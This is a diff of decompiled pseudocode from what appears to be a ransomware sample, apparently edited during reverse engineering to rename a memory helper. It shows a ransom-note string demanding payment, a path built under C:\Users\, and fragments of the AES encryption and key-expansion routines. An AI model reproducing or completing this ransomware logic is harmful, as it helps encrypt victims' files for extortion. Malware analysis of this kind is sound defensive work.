@@ -132,7 +132,7 @@ int __fastcall main(int argc, const char **argv, const char **envp)
              "\n"
              "Remember, the only way to recover your files is by paying the ransom. Any attempts to restore your data wit"
              "hout our assistance will lead to irreversible data loss.\n");
-  memsEX(v25, 0x108ui64);
+  memcpy_(v25, 0x108ui64);
   v5 = sub_7FF6EB2CA690((__int64)v17, (__int64)Buffer);
   v6 = sub_7FF6EB2CEF30(v16, "C:\\Users\\", v5);
   v7 = sub_7FF6EB2CEEA0((__int64)v15, v6, (__int64)"\\");
@@ -349,11 +349,11 @@ __int64 __fastcall coreee(__int64 a1, __int64 a2)
   char v17[272]; // [rsp+110h] [rbp-248h] BYREF
   char v18[272]; // [rsp+220h] [rbp-138h] BYREF
 
-  memsEX(v18, 0x110ui64);
+  memcpy_(v18, 0x110ui64);
   sub_7FF6EB2C8D40((__int64)v18, a1, 32, 0x40u, 1);
-  memsEX(v17, 0x108ui64);
+  memcpy_(v17, 0x108ui64);
   sub_7FF6EB2C7650((__int64)v17, a2, 32, 64, 1);
-  memsEX(v16, 0x20ui64);
+  memcpy_(v16, 0x20ui64);
   v4 = unknown_libname_119((__int64)v3);
   qmemcpy(v7, (const void *)sub_7FF6EB2C7510(v13), sizeof(v7));
   qmemcpy(v9, v7, sizeof(v9));
@@ -362,7 +362,7 @@ __int64 __fastcall coreee(__int64 a1, __int64 a2)
   qmemcpy(v11, v9, sizeof(v11));
   qmemcpy(v12, v10, sizeof(v12));
   sub_7FF6EB2CE880(v16, v12, (const struct __crt_win32_buffer_empty_debug_info *)v11, v4);
-  memsEX(v15, 32ui64);
+  memcpy_(v15, 32ui64);
   AES(v15, (__int64)v16, (__int64)&key, (__int64)iv);
   v5 = sub_7FF6EB2C9550((__int64)v15);
   v6 = sub_7FF6EB2C9580((__int64)v15);
@@ -405,7 +405,7 @@ int SBOX_init()
   char v6[16]; // [rsp+460h] [rbp-38h] BYREF
   char v7[40]; // [rsp+470h] [rbp-28h] BYREF
 
-  memsEX(sbox, 0x20ui64);
+  memcpy_(sbox, 0x20ui64);
   v4 = unknown_libname_119((__int64)v1);
   v2[0] = 131;
   v2[1] = 246;
@@ -697,9 +697,9 @@ _QWORD *__fastcall coree(__int64 a1, _QWORD *a2, __int64 a3)
   __int64 v20[4]; // [rsp+128h] [rbp-50h] BYREF
   char v21[32]; // [rsp+148h] [rbp-30h] BYREF
 
-  memsEX(v21, 0x20ui64);
+  memcpy_(v21, 0x20ui64);
   expand_keyyy(a1, v21, a1);
-  memsEX(a2, 0x20ui64);
+  memcpy_(a2, 0x20ui64);
   sub_7FF6EB2C9DF0(a2, a3);
   for ( i = 0; i < 10; ++i )
   {
